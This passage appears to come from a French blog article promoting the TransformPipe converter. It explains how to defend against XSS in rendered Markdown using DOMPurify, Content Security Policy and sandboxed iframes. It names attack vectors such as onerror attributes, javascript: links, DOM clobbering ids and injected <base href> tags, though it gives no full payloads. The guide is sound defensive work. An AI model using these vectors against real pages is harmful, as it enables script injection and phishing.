Une CSP n’est pas un assainisseur et ne lui fait pas concurrence. Elle répond à une autre question : que se passe-t-il quand l’assainisseur se trompe. Un assainisseur tente de garantir qu’aucun balisage exécutable n’atteint la page ; une CSP dit au navigateur de ne pas exécuter de balisage, quelle que soit la façon dont il est arrivé.

| Avantages | Inconvénients |
| --- | --- |
| Agit sur le bogue que vous n’avez pas encore trouvé | Ne remplace pas l’assainissement ; elle ne retire rien |
| `script-src 'none'` est absolu sur une page qui n’a aucun script à elle | Une page applicative qui exécute son propre JavaScript ne peut pas employer `'none'` |
| `base-uri 'none'` et `frame-ancestors 'none'` ferment des vecteurs qu’aucune liste blanche ne couvre | Greffer une politique sur une application existante représente un vrai travail |
| Des points de collecte transforment les tentatives d’injection en télémétrie | `frame-ancestors` et `sandbox` sont ignorés dans une balise `<meta>` |

**Prix :** gratuit, un standard du web mis en œuvre par les navigateurs.

**Détails techniques et fonctions**

- `script-src 'none'` sur une page dont le seul métier est d’afficher des documents
- `base-uri 'none'` neutralise un `<base href>` injecté, ce qu’aucune liste blanche de balises ne sait exprimer
- `frame-ancestors 'none'` empêche que votre document soit encadré dans la page de quelqu’un d’autre
- `img-src` et `connect-src` limitent les destinations qu’un élément survivant peut atteindre
- Livrée comme en-tête de réponse ou comme balise `<meta http-equiv>`, la forme meta ignorant `frame-ancestors`, `report-uri` et `sandbox`

**Pour qui ?** Pour toute page qui rend le document de quelqu’un d’autre. L’arbitrage est réel : une page qui exécute son propre JavaScript ne peut pas employer `script-src 'none'`, ce qui plaide pour rendre les documents venus d’ailleurs sur une route dédiée. Un document [partagé sous forme de lien](/blog/share-a-markdown-document-as-a-link) depuis TransformPipe est servi ainsi, et le fichier que vous téléchargez ne contient aucun script.

### Un iframe en bac à sable — l’isolement quand filtrer ne suffit pas

Il arrive que le document doive conserver du balisage que vous ne pouvez pas autoriser sans danger : un rapport interne avec ses propres styles, un courriel rendu, la sortie d’un système que vous ne contrôlez pas. Rendez-le dans un iframe muni d’un attribut `sandbox` et il s’exécute dans une origine opaque, sans aucun accès à votre page.

| Avantages | Inconvénients |
| --- | --- |
| De l’isolement plutôt que du filtrage : les trous de la liste blanche pèsent moins | La mise en page vous revient désormais : dimensions, défilement, impression |
| `sandbox` sans `allow-same-origin` signifie aucun accès à votre stockage ni à votre DOM | `allow-scripts` et `allow-same-origin` réunis annulent tout le dispositif |
| Se combine avec une CSP au lieu de lui faire concurrence | Liens, focus et accessibilité demandent tous un câblage délibéré |

**Prix :** gratuit, partie intégrante du HTML.

**Pour qui ?** Pour quiconque affiche des documents dont le balisage doit rester intact. Employez-le *avec* un assainisseur, pas à sa place — un bac à sable empêche un script d’atteindre votre page, et ne fait rien contre un document qui hameçonne le lecteur à l’intérieur du cadre.

### TransformPipe — un convertisseur qui a déjà tranché ces questions

TransformPipe convertit du Markdown en un document HTML complet et autonome, dans votre navigateur. Ce qui compte ici, c’est que l’assainissement n’est pas une option que l’on peut oublier d’activer : le HTML brut de la source franchit une liste blanche sur le chemin de la page et sur celui du fichier exporté.

| Avantages | Inconvénients |
| --- | --- |
| Une liste blanche, appliquée par DOMPurify dans le navigateur et par `xss` sur le serveur | La liste blanche est figée : pas de politique personnalisée à vous |
| Les identifiants de titres sont préfixés : les ancres engendrées ne peuvent pas masquer vos variables globales | Un document à la fois, et non une chaîne de build |
| Déconnecté, rien n’est téléversé — le fichier est lu et converti localement | C’est le navigateur qui travaille : un très gros fichier dépend donc de la machine |
| L’export tient en un seul fichier, sans la moindre requête externe | Ce n’est pas une bibliothèque : il convertit, il ne s’intègre pas à votre application |

**Prix :** gratuit. Un compte ajoute l’historique, le partage et une API, gratuits eux aussi.

**Détails techniques et fonctions**

- Assainit le HTML rendu, et non la source Markdown
- La même liste blanche des deux côtés de la frontière réseau : les deux ne peuvent donc pas diverger
- Les identifiants de titres sont préfixés par `doc-`, ce qui est la défense contre le DOM clobbering appliquée à la main
- La même conversion depuis une API REST, une interface en ligne de commande, une GitHub Action et un serveur MCP

**Pour qui ?** Pour quiconque détient un fichier `.md` venu d’ailleurs et doit l’envoyer à quelqu’un. La sortie d’un modèle est le cas courant : [en faire une page lisible](/blog/ai-output-to-a-shareable-page) revient à rendre une chaîne que vous n’avez pas écrite, c’est-à-dire exactement le problème décrit ici.

## Là où le choix évident échoue

DOMPurify est le bon choix par défaut, et la section honnête porte sur ses limites, car « nous utilisons DOMPurify » est l’endroit où beaucoup de revues de sécurité s’arrêtent.

**Il lui faut un DOM, et un faux DOM échoue en grand ouvert.** Sur un serveur, vous embarquez jsdom ou vous prenez une autre bibliothèque. Placé dans un environnement inexploitable, DOMPurify renvoie son entrée inchangée au lieu de lever une exception, ce qui est le pire mode de défaillance disponible : une configuration cassée et une configuration correcte produisent une sortie identique pour tout document sans HTML. Ne pas tester cela coûte un service qui n’a jamais rien assaini et n’a aucun moyen de le savoir.

**Les valeurs par défaut sont larges, et l’option dangereuse est désactivée.** La liste blanche livrée avec DOMPurify est conçue pour être utile en général, pas minimale pour votre produit, et `SANITIZE_NAMED_PROPS` — l’option qui arrête réellement le DOM clobbering — reste désactivée tant que vous ne l’activez pas. Ni l’un ni l’autre n’est un reproche fait à la bibliothèque ; les deux sont un reproche fait au geste qui consiste à l’installer et à passer à autre chose.

**Un assainisseur ne peut pas connaître vos variables globales.** `id="config"`, `id="state"`, `id="init"` — quels que soient les noms que votre propre code manipule sur `window` — lui sont invisibles, parce qu’aucun assainisseur ne lit votre paquet applicatif. Préfixer chaque identifiant conservé est la seule défense qui passe à l’échelle, puisqu’elle cesse de dépendre d’une liste de noms que quelqu’un doit entretenir.

**Propre ne veut pas dire inoffensif.** Une liste blanche qui autorise `<a href="https://...">` et `<img src="https://...">` autorise une page qui ressemble trait pour trait à votre écran de connexion, et une image dont le chargement indique à un tiers le moment où un document a été ouvert. Ni l’un ni l’autre n’exécute de script, ni l’un ni l’autre n’est une faille XSS. Si votre modèle de menace inclut l’hameçonnage ou les accusés de lecture, l’assainisseur n’est pas le contrôle qu’il vous faut — `img-src` dans une CSP s’en rapproche, et une page intercalaire sur les liens sortants davantage encore.

**Tout ce qui se trouve en aval hérite du risque et rien de la garantie.** Le coloriseur, l’injecteur d’ancres, le gabarit d’enveloppe, l’expression régulière qui « ajoute juste `target=_blank` » : chacun est un endroit où du HTML assaini redevient du HTML non assaini, sans le moindre changement visible dans le code qui appelle l’assainisseur. C’est la façon la plus courante dont un assainisseur correct finit dans un rapport d’incident.

**Le serveur ne peut pas poser d’en-tête sur un fichier.** Une CSP est une propriété d’une réponse, et un fichier `.html` téléchargé n’est pas une réponse. Ouvert depuis le disque, il n’a aucun en-tête : la seule politique qu’il peut porter est une balise `<meta http-equiv>` — qui fonctionne pour `script-src` et `img-src` et se trouve ignorée pour `frame-ancestors` et `sandbox`. D’où l’argument en faveur d’un export totalement dépourvu de scripts : un document sans rien d’exécutable est sûr même en `file://`, là où aucun en-tête ne peut l’atteindre.

## Assainir un document que vous êtes sur le point de remettre à quelqu’un

La plupart des textes consacrés au xss markdown supposent une application web : votre page, votre origine, votre session. Convertir un fichier est une situation différente, assortie de devoirs différents.

Quand vous rendez dans votre application du Markdown venu d’ailleurs, vous protégez vos utilisateurs d’un document. Quand vous convertissez un fichier Markdown et envoyez le HTML à un collègue, c’est *lui* que vous protégez d’un document — un document qui arrive à son nom, depuis une adresse à laquelle il fait confiance, et qui a franchi tout le filtrage que son organisation applique aux pièces jointes d’inconnus. Un `<script>` qui survit à votre conversion a été blanchi.

Trois conséquences en découlent. Assainissez à la conversion même s’il ne s’agit « que d’un document », parce que le navigateur du destinataire exécutera ce que vous envoyez tout aussi volontiers que le vôtre. Préférez un export sans aucun script à un export doté de scripts inoffensifs, puisque ni le destinataire ni sa passerelle de messagerie ne peuvent contrôler la différence. Et gardez le fichier autonome, ce qui est une propriété de sécurité autant qu’un confort : un document qui ne demande rien au réseau ne peut pas signaler le moment où il a été lu, et ne peut pas changer après votre envoi.

Testez ensuite votre propre chaîne avec trois entrées : un attribut `onerror`, un lien `javascript:`, et un `id` correspondant à une variable globale que votre code consulte. Si l’une des deux premières atteint la page, il vous manque un assainisseur et probablement un en-tête. La troisième l’atteindra, et c’est bien l’objectif — vérifiez qu’elle arrive sous un préfixe, et non sous le nom que votre code consulte. Si vous choisissez un convertisseur au lieu d’en bâtir un, [ce que chaque outil fait à l’étape d’assainissement](/blog/best-markdown-to-html-converters) est la colonne qui compte, et plusieurs outils bien vus laissent passer le HTML brut par conception.

## Comment choisir

1. **Demandez-vous si le HTML brut est réellement une fonctionnalité que vous offrez.** Si ce n’est pas le cas, échappez-le et arrêtez-vous là : `html: false` dans `markdown-it` ne coûte rien à entretenir et ne se contourne pas, tandis que l’alternative est une liste blanche dont vous serez encore propriétaire dans trois ans.
2. **Choisissez l’assainisseur qui s’exécute là où le HTML est rendu, puis testez sa défaillance.** Dans un navigateur, DOMPurify emploie l’analyseur qui affichera le résultat, ce qui referme la brèche du XSS par mutation ; sur un serveur, chaque option apporte son propre analyseur, choisissez-en donc une qui vise la fidélité aux navigateurs — et faites affirmer par votre suite de tests qu’une balise `<script>` est retirée dans la configuration de production, car un DOM mal configuré échoue en grand ouvert et en silence.
3. **Écrivez une seule liste blanche et importez-la partout.** Deux assainisseurs configurés séparément finiront par diverger, et le jour venu, le document qui s’affiche sans danger dans votre application est stocké avec un `<iframe>` dedans, à l’intention du prochain consommateur.
4. **Placez l’assainisseur après le moteur de rendu et après chaque transformation, et préfixez chaque identifiant qu’il conserve.** Tout ce qui modifie la chaîne HTML en aval se situe hors de la garantie de l’assainisseur, et le DOM clobbering n’a besoin d’aucun script : un préfixe sur les identifiants conservés — y compris ceux que produisent vos ancres de titres — est une modification d’une ligne qui met fin à toute une classe de bogues.
5. **Ajoutez l’en-tête dont vous auriez besoin si l’assainisseur se trompait.** `script-src 'none'`, `base-uri 'none'` et `frame-ancestors 'none'` sur une route d’affichage de documents transforment une injection réussie en une requête bloquée ; si vous ne pouvez pas les employer parce que la page fait tourner votre application, c’est précisément la raison de déplacer le rendu des documents sur une route à part.

## Conclusion

Markdown autorise le HTML brut parce qu’il a été conçu ainsi, et aucune précaution prise dans un analyseur n’y changera rien ; la sûreté d’un document Markdown rendu est une propriété de ce que vous faites après le rendu. Cela signifie une liste blanche écrite et appliquée au HTML rendu, la même liste blanche dans le navigateur et sur le serveur, chaque identifiant conservé préfixé, plus rien qui modifie la chaîne ensuite, et une Content Security Policy derrière tout cela pour le bogue que vous n’avez pas trouvé. Si vous préférez ne pas assumer ce code pour un fichier que vous devez seulement convertir et envoyer, [la conversion de Markdown vers HTML d’un convertisseur qui assainit par défaut](/) applique ces étapes dans votre navigateur — une liste blanche, des identifiants de titres préfixés, un export sans script et sans requête réseau, gratuitement, et sans rien téléverser tant que vous n’êtes pas connecté.

## FAQ

### Markdown est-il vulnérable au XSS ?

Markdown est en soi un format texte, mais presque tous les moteurs de rendu Markdown laissent passer le HTML brut jusqu’à la sortie, ce qui veut dire qu’un fichier `.md` peut porter `<script>`, `onerror=` et des URL `javascript:` directement jusqu’au navigateur. La vulnérabilité est dans la chaîne de rendu, pas dans le format. Toute chaîne qui rend du Markdown que vous n’avez pas écrit a besoin d’un assainisseur entre le moteur de rendu et la page.

### DOMPurify suffit-il à rendre Markdown sûr ?

Il retire le balisage exécutable, ce qui constitue l’essentiel du travail, et il laisse trois trous. Sa protection contre le DOM clobbering n’est complète qu’avec `SANITIZE_NAMED_PROPS` activé, il ne peut pas savoir quelles variables globales votre propre code consulte, et tout ce qui modifie la chaîne HTML après son passage se situe hors de sa garantie. Associez-le à une Content Security Policy et traitez sa sortie comme définitive.

### Faut-il assainir le Markdown ou le HTML ?

Le HTML, toujours, et seulement une fois toutes les transformations passées. Markdown offre plusieurs orthographes pour une même sortie et le moteur de rendu invente du balisage qui n’a jamais figuré dans la source — un lien automatique devient une ancre complète, un titre devient un identifiant. Un filtre posé sur la source vérifie donc une chaîne qui n’est pas celle qui part.

### Suffit-il d’échapper le HTML au lieu de l’assainir ?

Si vos utilisateurs n’ont pas besoin d’écrire du HTML, échapper vaut mieux qu’assainir : cela produit du texte, il n’y a donc rien à contourner ni aucune liste blanche à entretenir. `markdown-it` le fait par défaut avec `html: false`. Dès l’instant où quelqu’un a besoin d’un bloc `<details>` ou d’un tableau intégré, vous revoilà avec une liste blanche.

### Contre quoi une Content Security Policy protège-t-elle qu’un assainisseur ne couvre pas ?

Contre le bogue de votre assainisseur. Un assainisseur retire le balisage qu’il reconnaît comme dangereux ; une CSP dit au navigateur de n’exécuter aucun script, ce qui tient même quand quelque chose est passé. Elle ferme aussi des vecteurs qu’une liste blanche ne sait pas exprimer, comme un `<base href>` injecté — celui-là demande `base-uri 'none'`.

### Du HTML brut dans Markdown peut-il nuire sans le moindre JavaScript ?

Oui, et c’est la partie que l’on manque. Un attribut `id` masque une variable globale, un `<base href>` réoriente tous les liens relatifs de la page, un `<form action>` envoie ailleurs ce que saisit le lecteur, `position: fixed` dans un attribut `style` recouvre votre interface de celle d’un autre, et un `<img src>` distant signale le moment où votre document a été lu. Aucun de ces cas n’a besoin d’une balise de script.

### Un fichier `.md` m’est arrivé d’un inconnu : le HTML converti est-il sans danger à l’ouverture ?

Seulement avec un convertisseur qui assainit, et il vaut la peine de savoir lequel. Plusieurs convertisseurs très répandus laissent passer le HTML brut par conception et le disent dans leur documentation : le `<script>` du fichier devient donc un `<script>` dans le HTML que vous ouvrez. Vérifiez le comportement de l’outil avant de double-cliquer sur sa sortie, et souvenez-vous que si vous transmettez ce HTML, il arrive désormais de votre part.
